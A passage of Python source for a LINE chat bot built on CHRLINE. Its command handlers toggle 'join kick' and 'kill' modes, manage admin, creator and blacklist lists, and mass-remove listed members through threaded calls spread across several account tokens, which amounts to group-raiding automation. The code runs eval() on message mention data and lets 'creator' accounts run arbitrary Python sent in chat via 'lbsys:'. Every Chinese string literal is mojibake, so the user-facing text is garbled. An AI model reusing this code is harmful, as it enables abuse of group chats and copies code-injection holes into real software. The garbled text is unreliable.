                        case 'lb:jk on':
                            if to not in jk["joinkick"]:
                                jk["joinkick"].append(to)
                                han.replyMessage(msg,"â€»Join Kickâ¤ğŸŸ¢")
                                backupData()
                            else:
                                han.replyMessage(msg,"å·²ç¶“æ˜¯é–‹å•Ÿç‹€æ…‹")
                        case 'lb:jk off':
                            if to in jk["joinkick"]:
                                jk["joinkick"].remove(to)
                                han.replyMessage(msg,"â€»Join Kickâ¤ğŸ”´")
                                backupData()
                            else:
                                han.replyMessage(msg,"å·²ç¶“æ˜¯é—œé–‰ç‹€æ…‹")
                        case 'lb:asy on':
                            if settings["asynckill"] == False:
                                settings["asynckill"] = True
                                han.replyMessage(msg,"â€»Async Killâ¤ğŸŸ¢")
                                backupData()
                            else:
                                han.replyMessage(msg,"å·²ç¶“æ˜¯é–‹å•Ÿç‹€æ…‹")
                        case 'lb:asy off':
                            if settings["asynckill"] == True:
                                settings["asynckill"] = False
                                han.replyMessage(msg,"â€»Async Killâ¤ğŸ”´")
                                backupData()
                            else:
                                han.replyMessage(msg,"å·²ç¶“æ˜¯é—œé–‰ç‹€æ…‹")
                        case 'lb:ttkl on':
                            if settings["ttkl"] == False:
                                settings["ttkl"] = True
                                han.replyMessage(msg,"â€»Ttkl Killâ¤ğŸŸ¢")
                                backupData()
                            else:
                                han.replyMessage(msg,"å·²ç¶“æ˜¯é–‹å•Ÿç‹€æ…‹")
                        case 'lb:ttkl off':
                            if settings["ttkl"] == True:
                                settings["ttkl"] = False
                                han.replyMessage(msg,"â€»Ttkl Killâ¤ğŸ”´")
                                backupData()
                            else:
                                han.replyMessage(msg,"å·²ç¶“æ˜¯é—œé–‰ç‹€æ…‹")
                        case 'lb:url on':
                            a = han.getChats([to])
                            if a[1][0][8][1][2] == True:
                                han.updateChatPreventedUrl(msg[2], False)
                                han.replyMessage(msg,"â€»Urlâ¤ğŸŸ¢")
                            else:
                                han.replyMessage(msg,"å·²ç¶“æ˜¯é–‹å•Ÿç‹€æ…‹")
                            report(msg[2],msg[1],"åµæ¸¬é–‹å•Ÿç¾¤çµ„ç¶²å€")
                        case 'lb:url off':
                            a = han.getChats([to])
                            if a[1][0][8][1][2] == False:
                                han.updateChatPreventedUrl(msg[2], True)
                                han.replyMessage(msg,"â€»Urlâ¤ğŸ”´")
                            else:
                                han.replyMessage(msg,"å·²ç¶“æ˜¯é—œé–‰ç‹€æ…‹")
                            report(msg[2],msg[1],"åµæ¸¬é—œé–‰ç¾¤çµ„ç¶²å€")
                        case 'lb:geturl':
                            a = han.getChats([to])
                            if a[1][0][8][1][2] == False:
                                url = han.reissueChatTicket(to)
                                han.replyMessage(msg,"https://line.me/R/ti/g/{}".format(url[1]))
                            else:
                                han.replyMessage(msg,"ç¶²å€æœªé–‹å•Ÿ")
                        case 'lb:set':
                            try:
                                ret_ = "ÎÎÎÎÎã€˜Bot Statusã€™ÎÎÎÎÎ"    
                                if settings["autoJoin"] == True: ret_ += "\nâ€»Auto Joinâ¤ğŸŸ¢"
                                else: ret_ += "\nâ€»Auto Joinâ¤ğŸ”´"
                                if settings["asynckill"] == True: ret_ += "\nâ€»Async Killâ¤ğŸŸ¢"
                                else: ret_ += "\nâ€»Async Killâ¤ğŸ”´"
                                if settings["ttkl"] == True: ret_ += "\nâ€»Ttkl Killâ¤ğŸŸ¢"
                                else: ret_ += "\nâ€»Ttkl Killâ¤ğŸ”´"
                                ret_ +="\nÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎ"                   
                                ret_ += "\nCreator:ğ“±ğ“ªğ“·"
                                ret_ += "\nID: han174"
                                ret_ += "\nQR:http://line.me/ti/p/~han174"
                                ret_ += "\nÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎ"
                                han.replyMessage(msg, str(ret_))
                            except Exception as e:
                                han.replyMessage(msg,f'error-->\n{e}')
                        case 'lb:pi':
                            x = han.getChats([to])
                            y = x[1][0][8][1][2]
                            try:
                                ret_ = "ÎÎÎÎã€˜Group Statusã€™ÎÎÎÎ"   
                                if y == True: ret_ += "\nâ€»Group Urlâ¤ğŸ”´"
                                else: ret_ += "\nâ€»Group Urlâ¤ğŸŸ¢" 
                                if to in jk['joinkick']: ret_ += "\nâ€»Join Kickâ¤ğŸŸ¢"
                                else: ret_ += "\nâ€»Join Kickâ¤ğŸ”´"
                                if to in protect["adminprotect"]: ret_ += "\nâ€»Admin Protectâ¤ğŸŸ¢"
                                else: ret_ += "\nâ€»Admin Protectâ¤ğŸ”´"
                                if to in protect["kickprotect"]: ret_ += "\nâ€»Kick Protectâ¤ğŸŸ¢"
                                else: ret_ += "\nâ€»Kick Protectâ¤ğŸ”´"
                                if to in protect["inviteprotect"]: ret_ += "\nâ€»Invite Protectâ¤ğŸŸ¢"
                                else: ret_ += "\nâ€»Invite Protectâ¤ğŸ”´"
                                ret_ +="\nÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎ"                   
                                han.replyMessage(msg, str(ret_))
                            except Exception as e:
                                han.replyMessage(msg,f'error-->\n{e}')
                        case 'lb:runtime':
                            eltime = time.time() - mulai
                            bot = "ÎÎÎÎã€˜Run Timeã€™ÎÎÎÎ\n" +Runtime(eltime)
                            han.replyMessage(msg,bot)
                        case 'lb:al':
                            try:
                                if admin['admin'] == []:
                                    han.replyMessage(msg,"ÎÎÎÎÎã€˜æ¬Šé™åå–®ã€™ÎÎÎÎÎ\nç©º\nÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎ")
                                else:
                                    mc = "ÎÎÎÎÎÎÎã€˜æ¬Šé™åå–®ã€™ÎÎÎÎÎÎÎ"
                                    no = 0 
                                    try:
                                        for mi_d in admin['admin']:
                                            try:
                                                no += 1
                                                mc += f"\nâ€»{no}.{han.getContact(mi_d)[22]}"+"\n"+str(mi_d)
                                            except:
                                                print("éŒ¯èª¤:" +str(mi_d))
                                        han.replyMessage(msg,mc +"\nÎÎÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎÎÎ")
                                    except:
                                        han.replyMessage(msg,"ç®¡ç†å“¡ã€"+(str(len(admin)))+"ã€‘")
                            except Exception as e:
                                print('al error-->'+str(e))
                        case 'lb:cl':
                            try:
                                if creator['creator'] == []:
                                    han.replyMessage(msg,"ÎÎÎÎÎã€˜ä½œè€…åå–®ã€™ÎÎÎÎÎ\nç©º\nÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎ")
                                else:
                                    mc = "ÎÎÎÎÎÎÎã€˜ä½œè€…åå–®ã€™ÎÎÎÎÎÎÎ"
                                    no = 0 
                                    try:
                                        for mi_d in creator['creator']:
                                            try:
                                                no += 1
                                                mc += f"\nâ€»{no}.{han.getContact(mi_d)[22]}"+"\n"+str(mi_d)
                                            except:
                                                print("éŒ¯èª¤:" +str(mi_d))
                                        han.replyMessage(msg,mc +"\nÎÎÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎÎÎ")
                                    except:
                                        han.replyMessage(msg,"ä½œè€…ã€"+(str(len(admin)))+"ã€‘")
                            except Exception as e:
                                print('al error-->'+str(e))
                        case 'lb:bl':
                            try:
                                if ban['blacklist'] == []:
                                    han.replyMessage(msg,"ÎÎÎÎÎã€˜é»‘åå–®ã€™ÎÎÎÎÎ\nç©º\nÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎ")
                                else:
                                    mc = "ÎÎÎÎÎÎÎã€˜é»‘åå–®ã€™ÎÎÎÎÎÎÎ"
                                    no = 0 
                                    try:
                                        for mi_d in ban['blacklist']:
                                            try:
                                                no += 1
                                                mc += f"\nâ€»{no}.{han.getContact(mi_d)[22]}"+"\n"+str(mi_d)
                                            except:
                                                print("éŒ¯èª¤:" +str(mi_d))
                                        han.replyMessage(msg,mc +"\nÎÎÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎÎÎ")
                                    except:
                                        han.replyMessage(msg,"é»‘åå–®ã€"+(str(len(admin)))+"ã€‘")
                            except Exception as e:
                                print('bl error-->'+str(e))
                        case 'spl':
                            try:
                                mc = "ÎÎÎÎÎã€˜ç‰¹æ®Šåå–®ã€™ÎÎÎÎÎ\n"
                                mc += "ÎÎÎÎÎè¸¢äººåå–®ÎÎÎÎÎ"
                                if ybk['kick'] == []:
                                    mc += "\nç©º"
                                else:
                                    no = 0 
                                    try:
                                        for mi_d in ybk['kick']:
                                            try:
                                                no += 1
                                                mc += f"\nâ€»{no}.{han.getContact(mi_d)[22]}"
                                            except:
                                                print("éŒ¯èª¤:" +str(mi_d))
                                    except Exception as e:
                                        print('spl kick error-->'+str(e))    
                                mc += "\nÎÎÎÎÎå–æ¶ˆåå–®ÎÎÎÎÎ"
                                if ybk['cancel'] == []:
                                    mc += "\nç©º"
                                else:
                                    no = 0 
                                    try:
                                        for mi_d in ybk['cancel']:
                                            try:
                                                no += 1
                                                mc += f"\nâ€»{no}.{han.getContact(mi_d)[22]}"
                                            except:
                                                print("éŒ¯èª¤:" +str(mi_d))
                                    except Exception as e:
                                        print('spl cancel error-->'+str(e))
                                han.replyMessage(msg,mc +"\nÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎ")       
                            except Exception as e:
                                print('bl error-->'+str(e))
                        case 'tlist':
                            try:
                                mc = "ÎÎÎÎÎã€˜å°ˆæ­¦åå–®ã€™ÎÎÎÎÎ"
                                if ttkl['kick'] == []:
                                    mc += "\nç©º"
                                else:
                                    no = 0 
                                    try:
                                        for mi_d in ttkl['kick']:
                                            try:
                                                no += 1
                                                mc += f"\nâ€»{no}.{han.getContact(mi_d)[22]}"
                                            except:
                                                print("éŒ¯èª¤:" +str(mi_d))
                                    except Exception as e:
                                        print('ttkl error-->'+str(e))
                                han.replyMessage(msg,mc +"\nÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎ")
                            except Exception as e:
                                print('ttkl error-->'+str(e))
                        case 'lb:clearadmin':
                            if msg[1] in creator['creator']:
                                admin['admin'] = []
                                han.replyMessage(msg,"clear admin success")
                                backupData()
                            else:
                                han.replyMessage(msg,"ç„¡æ¬Šä½¿ç”¨é–‹ç™¼è€…æŒ‡ä»¤")
                                report(msg[2],msg[1],"ç®¡ç†å“¡å˜—è©¦æ¸…ç©ºæ¬Šé™")
                        case 'lb:clearban':
                            if msg[1] in creator['creator']:
                                ban['blacklist'] = []
                                han.replyMessage(msg,"clear blacklist success")
                                backupData()
                            else:
                                han.replyMessage(msg,"ç„¡æ¬Šä½¿ç”¨é–‹ç™¼è€…æŒ‡ä»¤")
                                report(msg[2],msg[1],"ç®¡ç†å“¡å˜—è©¦æ¸…ç©ºé»‘å–®")
                        case 'tcal':
                            ttkl['kick'] = []
                            han.replyMessage(msg,"å·²æ¸…å°ˆæ­¦åå–®")
                        case 'cspl':
                            ybk["kick"] = []
                            ybk["cancel"] = []
                            backupData()
                            han.replyMessage(msg,"å·²æ¸…ç©ºç‰¹æ®Šæ‹†åå–®")
                        case 'kspl':
                            if settings['async'] == True:
                                if ybk["kick"] and ybk["cancel"] != '':
                                    n=0
                                    f=0
                                    async def tk(n,to, i):
                                        threading.Thread(target=han.deleteOtherFromChat, args=(n, msg[2], [i],)).start()
                                    jk['joinkick'].append(to)
                                    for x in ybk["kick"]:
                                        if n == len(account["token"]):n = 0
                                        asyncio.run(tk(n,to, x))
                                        n += 1
                                    for x in ybk["cancel"]:
                                        han.cancelGroupInvitation(to,[x])
                                    return
                                else:han.relatedMessage(to,"åˆ—è¡¨ä¸­ç„¡äºº",op.message.id)
                            else:han.relatedMessage(to,"ä½ å°šæœªé–‹å•ŸåŠŸèƒ½",op.message.id)
                        case 'gid':
                            han.replyMessage(msg,msg[2])
                        case 'mymid':
                            han.replyMessage(msg,msg[1])
                        case 'lb:bye':
                            han.replyMessage(msg, "accept exit command")
                            try:
                                jk["joinkick"].remove(to)
                            except:
                                pass
                            try:
                                protect["adminprotect"].remove(to)
                            except:
                                pass
                            try:
                                protect["kickprotect"].remove(to)
                            except:
                                pass
                            try:
                                protect["inviteprotect"].remove(to)
                            except:
                                pass
                            han.deleteSelfFromChat(to) 
                            report(msg[2],msg[1],"é€€ç¾¤æŒ‡ä»¤è§¸ç™¼")
                        case 'lb:mine':
                            ret="ÎÎÎÎÎã€˜æ©Ÿå™¨ç‹€æ…‹æŸ¥è©¢ã€™ÎÎÎÎÎ"
                            ret2=""
                            try:
                                han.deleteOtherFromChat(to,["Fuck you"])
                            except Exception as e:
                                if e.message == "request blocked":
                                    ret+=f"\nâ€»è¸¢äººç‹€æ…‹:ğŸ”´\nâ€»é‚€è«‹ç‹€æ…‹:ğŸ”´"
                                else:
                                    ret+=f"\nâ€»è¸¢äººç‹€æ…‹:ğŸŸ¢\nâ€»é‚€è«‹ç‹€æ…‹:ğŸŸ¢"
                            try:
                                han.findAndAddContactsByMid("u0348f477412bc2506bcafb74902367ad")
                                ret+=f"\nâ€»åŠ å‹ç‹€æ…‹:ğŸŸ¢"
                            except Exception as e:
                                if e.message == "request blocked":
                                    ret+=f"\nâ€»åŠ å‹ç‹€æ…‹:ğŸ”´"
                            ret+= "\nâ€»å–æ¶ˆç‹€æ…‹:ğŸŸ¢"
                            ret+= "\nâ€»ç‰ˆæœ¬è³‡è¨Š:CHRLINEbot V1.0"
                            han.replyMessage(msg,f"{ret}" + "\nÎÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎÎ")
                        case 'lb:pic':
                            if msg[1] in creator['creator']:
                                han.replyMessage(msg,"è«‹å‚³é€åœ–ç‰‡")
                                settings["pic"] = True
                                settings["picmid"].append(msg[1]) 
                                backupData()
                            else:
                                han.replyMessage(msg,"ç„¡æ¬Šä½¿ç”¨é–‹ç™¼è€…æŒ‡ä»¤")
                                report(msg[2],msg[1],"ç®¡ç†å“¡å˜—è©¦æ›´æ›é ­è²¼")
                        case 'lb:cover':
                            if msg[1] in creator['creator']:
                                han.replyMessage(msg,"è«‹å‚³é€åœ–ç‰‡")
                                settings["cover"] = True
                                settings["covermid"].append(msg[1])
                                backupData()
                            else:
                                han.replyMessage(msg,"ç„¡æ¬Šä½¿ç”¨é–‹ç™¼è€…æŒ‡ä»¤")
                                report(msg[2],msg[1],"ç®¡ç†å“¡å˜—è©¦æ›´æ›å°é¢")
                        case 'lb:logout':
                            if msg[1] in creator['creator']:
                                han.replyMessage(msg,"å·²è‡ªå‹•ç™»å‡º")
                                os._exit(0)
                            else:
                                han.replyMessage(msg,"ç„¡æ¬Šä½¿ç”¨é–‹ç™¼è€…æŒ‡ä»¤")
                                report(msg[2],msg[1],"ç®¡ç†å“¡å˜—è©¦ç™»å‡º")
                        case 'tkal':
                            if settings['ttkl'] == True:
                                if ttkl['kick'] == []:
                                    han.replyMessage(msg, "åˆ—è¡¨ä¸­ç„¡äºº(ï½¡ï½¥Ï‰ï½¥ï½¡)")
                                else:
                                    try:
                                        for x in ttkl["kick"]:
                                            threading.Thread(target=han.deleteOtherFromChat, args=(msg[2],[x])).start()
                                        jk["joinkick"].append(to)
                                        han.replyMessage(msg, "å·²è‡ªå‹•é–‹å•Ÿé€²ç¾¤ä¿è­·")
                                    except:
                                        han.replyMessage(msg,"Error-->request blocked")
                            else:
                                han.replyMessage(msg, "ä½ å°šæœªé–‹å•ŸåŠŸèƒ½")
                            report(msg[2],msg[1],"å°ˆæ­¦æŒ‡ä»¤è§¸ç™¼")
                    if text.startswith("lbttk"):
                        klist = []
                        if 'MENTION' in msg[18]:
                            key = eval(msg[18]["MENTION"])
                            tags = key["MENTIONEES"]
                            for tag in tags:
                                mid = han.getContact(tag['M'])
                                if han.profile[1] in mid[1]:
                                    continue
                                if mid[1] not in klist and mid[1] not in bigdick:
                                    klist.append(mid[1])
                                    try:
                                        for kmid in klist:
                                            threading.Thread(target=han.deleteOtherFromChat, args=(msg[2], kmid)).start()
                                    except:
                                        han.replyMessage(msg,"Error-->request blocked")
                        del klist
                    elif text.startswith('lbsys:'):
                        if msg[1] in creator['creator']:
                            try:
                                with stdoutIO() as s:
                                    exec(msg[10][6:],globals(), locals())
                                han.sendMessage(msg[2],'output -->\n'+s.getvalue(),relatedMessageId=msg[4])
                            except Exception as e:
                                han.sendMessage(msg[2],'error --> '+str(e),relatedMessageId=msg[4])
                        else:
                            han.replyMessage(msg,"ç„¡æ¬Šä½¿ç”¨é–‹ç™¼è€…æŒ‡ä»¤")
                            report(msg[2],msg[1],"ç®¡ç†å“¡å˜—è©¦ä½¿ç”¨sysæŒ‡ä»¤")
                    elif text.startswith("mid"):  
                        mlists = []
                        if 'MENTION' in msg[18]:
                            key = eval(msg[18]["MENTION"])
                            tags = key["MENTIONEES"]
                            no = 0
                            for tag in tags:
                                mid = han.getContact(tag['M'])
                                if mid[1] not in mlists:
                                    mlists.append(mid[1])
                            txt = "ÎÎÎÎÎÎÎã€˜æŸ¥è©¢Midã€™ÎÎÎÎÎÎÎ"
                            no = 0
                            try:
                                for mlist in mlists:
                                    n = han.getContact(mlist)
                                    no += 1
                                    txt +=  f"\nâ€»{no}.{n[22]}"+"\n"+f"{n[1]}"
                            except:
                                pass
                        han.replyMessage(msg, txt + "\nÎÎÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎÎÎ")
                        del mlists              
                    elif text.startswith("lbadd"):
                        adminlist = []
                        adminlist2 = []
                        if 'MENTION' in msg[18]:
                            key = eval(msg[18]["MENTION"])
                            tags = key["MENTIONEES"]
                            for tag in tags:
                                mid = han.getContact(tag['M'])
                                if mid[1] not in admin['admin']:
                                    if mid[1] not in adminlist:
                                        adminlist.append(mid[1])
                                else:
                                    if mid[1] not in adminlist2:
                                        adminlist2.append(mid[1])
                            txt = "ÎÎÎÎÎã€˜æ–°å¢æ¬Šé™ã€™ÎÎÎÎÎ"
                            txt += "\nÎÎÎÎÎæ–°å¢æˆåŠŸÎÎÎÎÎ"
                            no = 0
                            if len(adminlist) != 0:
                                for x in adminlist:
                                    y = han.getContact(x)
                                    try:
                                        admin['admin'].append(x)
                                        backupData()
                                        no += 1
                                        txt +=  f"\nâ€»{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\nç„¡"
                            txt += "\nÎÎÎÎÎæ–°å¢å¤±æ•—ÎÎÎÎÎ"
                            no = 0
                            if len(adminlist2) != 0:
                                for x in adminlist2:
                                    y = han.getContact(x)
                                    try:
                                        no += 1
                                        txt +=  f"\nâ€»{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\nç„¡"
                            han.replyMessage(msg, txt + "\nÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎ")
                            report(msg[2],msg[1],"æ–°å¢æ¬Šé™æŒ‡ä»¤è§¸ç™¼",adminlist)
                        del adminlist
                        del adminlist2
                    elif text.startswith("lbdel"):
                        adminlist = []
                        adminlist2 = []
                        if 'MENTION' in msg[18]:
                            key = eval(msg[18]["MENTION"])
                            tags = key["MENTIONEES"]
                            for tag in tags:
                                mid = han.getContact(tag['M'])
                                if mid[1] in admin['admin']:
                                    if mid[1] not in adminlist:
                                        adminlist.append(mid[1])
                                else:
                                    if mid[1] not in adminlist2:
                                        adminlist2.append(mid[1])
                            txt = "ÎÎÎÎÎã€˜åˆªé™¤æ¬Šé™ã€™ÎÎÎÎÎ"
                            txt += "\nÎÎÎÎÎåˆªé™¤æˆåŠŸÎÎÎÎÎ"
                            no = 0
                            if len(adminlist) != 0:
                                for x in adminlist:
                                    y = han.getContact(x)
                                    try:
                                        admin['admin'].remove(x)
                                        backupData()
                                        no += 1
                                        txt +=  f"\nâ€»{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\nç„¡"
                            txt += "\nÎÎÎÎÎåˆªé™¤å¤±æ•—ÎÎÎÎÎ"
                            no = 0
                            if len(adminlist2) != 0:
                                for x in adminlist2:
                                    y = han.getContact(x)
                                    try:
                                        no += 1
                                        txt +=  f"\nâ€»{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\nç„¡"
                            han.replyMessage(msg, txt + "\nÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎ")
                            report(msg[2],msg[1],"åˆªé™¤æ¬Šé™æŒ‡ä»¤è§¸ç™¼",adminlist)
                        del adminlist
                        del adminlist2
                    elif text.startswith("del:"):
                        x = msg[10][4:]
                        y = han.getContact(x)
                        if len(x) != 33:
                            han.replyMessage(msg, "Error-->invalid mid")
                        else:
                            if msg[1] in creator['creator']:
                                if x in admin['admin']:
                                    txt = "ÎÎÎÎÎÎã€˜Midåˆªé™¤æ¬Šé™ã€™ÎÎÎÎÎÎ"
                                    admin['admin'].remove(x)
                                    backupData()
                                    txt += f"\n{y[22]}\n{x}"
                                    han.replyMessage(msg, txt+ "\nÎÎÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎÎÎ")
                                else:
                                    han.replyMessage(msg, "ä»–ä¸æ˜¯æ¬Šé™è€…")
                            else:
                                han.replyMessage(msg, "ç„¡æ¬Šä½¿ç”¨é–‹ç™¼è€…æŒ‡ä»¤")
                                report(msg[2],msg[1],"æ¬Šé™è€…å˜—è©¦ä½¿ç”¨Midåˆªé™¤æ¬Šé™")
                    elif text.startswith("cdel:"):
                        x = msg[10][5:]
                        y = han.getContact(x)
                        if len(x) != 33:
                            han.replyMessage(msg, "Error-->invalid mid")
                        else:
                            if msg[1] in creator['creator']:
                                if x in creator['creator']:
                                    txt = "ÎÎÎÎã€˜Midåˆªé™¤ä½œè€…æ¬Šé™ã€™ÎÎÎÎ"
                                    creator['creator'].remove(x)
                                    backupData()
                                    txt += f"\n{y[22]}\n{x}"
                                    han.replyMessage(msg, txt+ "\nÎÎÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎÎÎ")
                                else:
                                    han.replyMessage(msg, "ä»–æ²’æœ‰ä½œè€…æ¬Šé™")
                            else:
                                han.replyMessage(msg, "ç„¡æ¬Šä½¿ç”¨é–‹ç™¼è€…æŒ‡ä»¤")
                                report(msg[2],msg[1],"æ¬Šé™è€…å˜—è©¦ä½¿ç”¨Midåˆªé™¤ä½œè€…æ¬Šé™")
                    elif text.startswith("lbcadd"):
                        if msg[1] in bigdick:
                            adminlist = []
                            adminlist2 = []
                            if 'MENTION' in msg[18]:
                                key = eval(msg[18]["MENTION"])
                                tags = key["MENTIONEES"]
                                for tag in tags:
                                    mid = han.getContact(tag['M'])
                                    if mid[1] not in creator['creator']:
                                        if mid[1] not in adminlist:
                                            adminlist.append(mid[1])
                                    else:
                                        if mid[1] not in adminlist2:
                                            adminlist2.append(mid[1])
                                txt = "ÎÎÎÎã€˜æ–°å¢ä½œè€…æ¬Šé™ã€™ÎÎÎÎ"
                                txt += "\nÎÎÎÎÎæ–°å¢æˆåŠŸÎÎÎÎÎ"
                                no = 0
                                if len(adminlist) != 0:
                                    for x in adminlist:
                                        y = han.getContact(x)
                                        try:
                                            creator['creator'].append(x)
                                            backupData()
                                            no += 1
                                            txt +=  f"\nâ€»{no}.{y[22]}"
                                        except:
                                            pass
                                else:
                                    txt += "\nç„¡"
                                txt += "\nÎÎÎÎÎæ–°å¢å¤±æ•—ÎÎÎÎÎ"
                                no = 0
                                if len(adminlist2) != 0:
                                    for x in adminlist2:
                                        y = han.getContact(x)
                                        try:
                                            no += 1
                                            txt +=  f"\nâ€»{no}.{y[22]}"
                                        except:
                                            pass
                                else:
                                    txt += "\nç„¡"
                                han.replyMessage(msg, txt + "\nÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎ")
                                
                            del adminlist
                            del adminlist2
                        else:
                            han.replyMessage(msg, "ç„¡æ¬Šä½¿ç”¨é–‹ç™¼è€…æŒ‡ä»¤")
                            report(msg[2],msg[1],"ç®¡ç†å“¡å˜—è©¦æ–°å¢ä½œè€…æ¬Šé™")
                    elif text.startswith("lbcdel"):
                        if msg[1] in bigdick:
                            adminlist = []
                            adminlist2 = []
                            if 'MENTION' in msg[18]:
                                key = eval(msg[18]["MENTION"])
                                tags = key["MENTIONEES"]
                                for tag in tags:
                                    mid = han.getContact(tag['M'])
                                    if mid[1] in creator['creator']:
                                        if mid[1] not in adminlist:
                                            adminlist.append(mid[1])
                                    else:
                                        if mid[1] not in adminlist2:
                                            adminlist2.append(mid[1])
                                txt = "ÎÎÎÎã€˜åˆªé™¤ä½œè€…æ¬Šé™ã€™ÎÎÎÎ"
                                txt += "\nÎÎÎÎÎåˆªé™¤æˆåŠŸÎÎÎÎÎ"
                                no = 0
                                if len(adminlist) != 0:
                                    for x in adminlist:
                                        y = han.getContact(x)
                                        try:
                                            creator['creator'].remove(x)
                                            backupData()
                                            no += 1
                                            txt +=  f"\nâ€»{no}.{y[22]}"
                                        except:
                                            pass
                                else:
                                    txt += "\nç„¡"
                                txt += "\nÎÎÎÎÎåˆªé™¤å¤±æ•—ÎÎÎÎÎ"
                                no = 0
                                if len(adminlist2) != 0:
                                    for x in adminlist2:
                                        y = han.getContact(x)
                                        try:
                                            no += 1
                                            txt +=  f"\nâ€»{no}.{y[22]}"
                                        except:
                                            pass
                                else:
                                    txt += "\nç„¡"
                                han.replyMessage(msg, txt + "\nÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎ")
                            del adminlist
                            del adminlist2
                        else:
                            han.replyMessage(msg, "ç„¡æ¬Šä½¿ç”¨é–‹ç™¼è€…æŒ‡ä»¤")
                            report(msg[2],msg[1],"ç®¡ç†å“¡å˜—è©¦åˆªé™¤ä½œè€…æ¬Šé™")
                    elif text.startswith("ban"):
                        blist = []
                        blist2 = []
                        if 'MENTION' in msg[18]:
                            key = eval(msg[18]["MENTION"])
                            tags = key["MENTIONEES"]
                            for tag in tags:
                                mid = han.getContact(tag['M'])
                                if mid[1] not in admin['admin'] and mid[1] not in ban['blacklist'] and mid[1] not in creator['creator']:
                                    if mid[1] not in blist:
                                        blist.append(mid[1])
                                else:
                                    if mid[1] not in blist2:
                                        blist2.append(mid[1])
                            txt = "ÎÎÎÎÎã€˜æ–°å¢é»‘å–®ã€™ÎÎÎÎÎ"
                            txt += "\nÎÎÎÎÎæ–°å¢æˆåŠŸÎÎÎÎÎ"
                            no = 0
                            if len(blist) != 0:
                                for x in blist:
                                    y = han.getContact(x)
                                    try:
                                        ban['blacklist'].append(x)
                                        backupData()
                                        no += 1
                                        txt +=  f"\nâ€»{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\nç„¡"
                            txt += "\nÎÎÎÎÎæ–°å¢å¤±æ•—ÎÎÎÎÎ"
                            no = 0
                            if len(blist2) != 0:
                                for x in blist2:
                                    y = han.getContact(x)
                                    try:
                                        no += 1
                                        txt +=  f"\nâ€»{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\nç„¡"
                            han.replyMessage(msg, txt + "\nÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎ")
                            report(msg[2],msg[1],"æ–°å¢é»‘å–®æŒ‡ä»¤è§¸ç™¼",blist)
                        del blist
                        del blist2     
                    elif text.startswith("unban"):
                        blist = []
                        blist2 = []
                        if 'MENTION' in msg[18]:
                            key = eval(msg[18]["MENTION"])
                            tags = key["MENTIONEES"]
                            for tag in tags:
                                mid = han.getContact(tag['M'])
                                if mid[1] in ban['blacklist']:
                                    if mid[1] not in blist:
                                        blist.append(mid[1])
                                else:
                                    if mid[1] not in blist2:
                                        blist2.append(mid[1])
                            txt = "ÎÎÎÎÎã€˜åˆªé™¤é»‘å–®ã€™ÎÎÎÎÎ"
                            txt += "\nÎÎÎÎÎåˆªé™¤æˆåŠŸÎÎÎÎÎ"
                            no = 0
                            if len(blist) != 0:
                                for x in blist:
                                    y = han.getContact(x)
                                    try:
                                        ban['blacklist'].remove(x)
                                        backupData()
                                        no += 1
                                        txt +=  f"\nâ€»{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\nç„¡"
                            txt += "\nÎÎÎÎÎåˆªé™¤å¤±æ•—ÎÎÎÎÎ"
                            no = 0
                            if len(blist2) != 0:
                                for x in blist2:
                                    y = han.getContact(x)
                                    try:
                                        no += 1
                                        txt +=  f"\nâ€»{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\nç„¡"
                            han.replyMessage(msg, txt + "\nÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎ")
                            report(msg[2],msg[1],"åˆªé™¤é»‘å–®æŒ‡ä»¤è§¸ç™¼",blist)
                        del blist
                        del blist2 
                    elif text.startswith("kadd"):
                        klist = []
                        klist2 = []
                        if 'MENTION' in msg[18]:
                            key = eval(msg[18]["MENTION"])
                            tags = key["MENTIONEES"]
                            for tag in tags:
                                mid = han.getContact(tag['M'])
                                if mid[1] not in ybk['kick'] and mid[1] not in admin['admin'] and mid[1] not in creator['creator']:
                                    if mid[1] not in klist:
                                        klist.append(mid[1])
                                else:
                                    if mid[1] not in klist2:
                                        klist2.append(mid[1])
                            txt = "ÎÎÎÎÎã€˜æ–°å¢è¸¢äººåå–®ã€™ÎÎÎÎÎ"
